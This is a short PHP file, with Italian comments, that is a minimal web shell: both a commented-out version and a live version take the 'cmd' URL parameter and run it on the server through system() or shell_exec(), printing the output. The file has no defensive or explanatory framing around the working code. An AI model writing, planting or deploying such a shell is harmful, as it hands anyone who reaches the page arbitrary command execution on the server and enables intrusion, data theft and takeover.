<!-- <?php
// Verifica se il parametro 'cmd' è presente nell'URL (es. pagina.php?cmd=ls)
// if (isset($_GET['cmd'])) {
    
//     // Assegna l'input dell'URL a una variabile
//     $comando = $_GET['cmd'];
    
//     echo "<pre>Risultato del comando: <b>" . htmlspecialchars($comando) . "</b>\n\n";
    
//     // Esegue il comando passato dall'utente e ne mostra l'output
//     system($comando);
    
//     echo "</pre>";
// } else {
//     echo "Nessun comando specificato. Usa ?cmd=nome_comando nell'URL.";
// }
?> -->

<?php
if (isset($_GET['cmd']))
{
    $cmd = $_GET['cmd'];
    echo '<pre>';
    $result = shell_exec($cmd);
    echo $result;
    echo '<pre>';
}
?>